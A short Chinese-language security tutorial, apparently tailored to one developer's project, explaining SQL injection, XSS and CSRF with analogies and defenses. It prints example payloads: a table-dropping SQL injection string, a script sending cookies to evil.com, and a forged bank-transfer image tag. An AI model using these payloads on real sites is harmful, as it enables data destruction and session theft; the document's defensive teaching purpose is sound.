# 安全攻击 - "SQL 注入 / XSS / CSRF"

> ⏱ 阅读时间：2 分钟

## 是什么

黑客常用的 3 种攻击方式，**任何接受用户输入的网站都可能中招**。

## 类比

| 攻击 | 类比 |
|---|---|
| SQL 注入 | 你问银行"我账户多少钱"，你说"账户余额 = 账户余额 + 100" |
| XSS | 黑客在留言板写"看这里有大奖"，点开后你的 Cookie 被偷 |
| CSRF | 你登录银行，黑客让你点个链接，你的钱被转走 |

## 1. SQL 注入

### 是什么

用户输入的 SQL 语句被**拼接到你的查询里**，改了原本的查询逻辑。

### 攻击例子

```sql
-- 你的代码
SELECT * FROM users WHERE name = '{用户输入}';

-- 黑客输入
' OR 1=1; DROP TABLE users; --

-- 拼出来变成
SELECT * FROM users WHERE name = '' OR 1=1; DROP TABLE users; --';
-- 结果：返回所有用户 + 删表
```

### 怎么防

| 方法 | 例子 |
|---|---|
| ✅ **参数化查询** | `SELECT * FROM users WHERE name = ?` （`?` 是占位符）|
| ✅ **ORM** | SQLAlchemy 自动参数化（你项目已经在用）|
| ❌ 字符串拼接 | 永远不要做 |
| ✅ 输入校验 | 长度、字符类型限制 |

**你的项目用 SQLAlchemy = 自动防 SQL 注入** ✓

## 2. XSS（跨站脚本攻击）

### 是什么

黑客在你的页面**注入 JS 代码**，其他用户访问时执行。

### 攻击例子

```html
<!-- 黑客在评论框输入 -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<!-- 其他用户看到这条评论时，cookie 被偷走 -->
```

### 怎么防

| 方法 | 说明 |
|---|---|
| ✅ **转义输出** | `<` → `&lt;`，`<script>` 显示成文本不执行 |
| ✅ **Content-Security-Policy** | HTTP 头限制能加载哪些 JS |
| ✅ **HttpOnly Cookie** | JS 读不到 cookie（即使有 XSS 也偷不到）|
| ✅ **不用 `innerHTML`** | 用 `textContent`（React 默认安全）|

**React/Next.js 默认转义**，你项目安全。

## 3. CSRF（跨站请求伪造）

### 是什么

用户**已登录 A 网站**，去 B 网站点了个链接，**B 偷偷用 A 的身份**发请求。

### 攻击例子

```html
<!-- 黑客网站上有这个图（实际是请求） -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- 用户在 bank.com 已登录，点了这张图，钱就被转了 -->
```

### 怎么防

| 方法 | 说明 |
|---|---|
| ✅ **CSRF Token** | 每次请求带个随机字符串，服务端校验 |
| ✅ **SameSite Cookie** | 浏览器自动挡（`Set-Cookie: SameSite=Strict`）|
| ✅ **验证 Referer** | 检查请求来源是不是自己的域名 |
| ✅ **二次确认** | 敏感操作要输密码/验证码 |

**Next.js 默认有 CSRF 保护**（在 server actions 里）。

## 其他常见攻击

| 攻击 | 一句话 | 防御 |
|---|---|---|
| **DDoS** | 大量请求打挂你 | Cloudflare / 阿里云高防 |
| **暴力破解** | 一直试密码 | 限频 + 验证码 + 锁定 |
| **中间人攻击** | 偷听你和服务器的对话 | HTTPS |
| **会话劫持** | 偷别人登录状态 | HttpOnly Cookie + HTTPS |
| **文件上传漏洞** | 上传 PHP/JS 拿服务器权限 | 校验文件类型 + 改文件名 + 存到非 Web 目录 |
| **点击劫持** | 用 iframe 套你的页面骗用户点 | `X-Frame-Options: DENY` |

## 关键点

- **任何"用户能输入"的地方都危险**
- **前后端都要防**（不只是后端）
- **用框架默认的安全特性**（自己造轮子容易出错）

## 跟你的项目关系

- 你用 **SQLAlchemy** = 自动防 SQL 注入 ✓
- 你用 **Next.js/React** = 自动防 XSS ✓
- 你有 **JWT 鉴权** + 写在 HttpOnly cookie = 部分防 CSRF
- **建议补**：CSRF Token、密码 bcrypt 哈希（你已做 ✓）、登录限频

## 缺了会怎样

- 漏洞 = **数据泄露** = 公司倒闭
- 小项目：被攻击概率低
- **一旦有用户**：必须严肃对待

## 怎么防护（最简清单）

- [ ] **HTTPS**（必须）
- [ ] **参数化查询**（不要字符串拼接 SQL）
- [ ] **密码 bcrypt 哈希**（不要明文）
- [ ] **HttpOnly Cookie**（cookie 偷不到）
- [ ] **输入校验**（长度、类型）
- [ ] **限频**（每 IP 每分钟最多 60 次请求）
- [ ] **CSP 头**（限制 JS 来源）
- [ ] **依赖更新**（`npm audit` / `pip-audit`）
- [ ] **日志记录敏感操作**（登录、改密、转账）
- [ ] **定期安全审计**（OWASP Top 10）
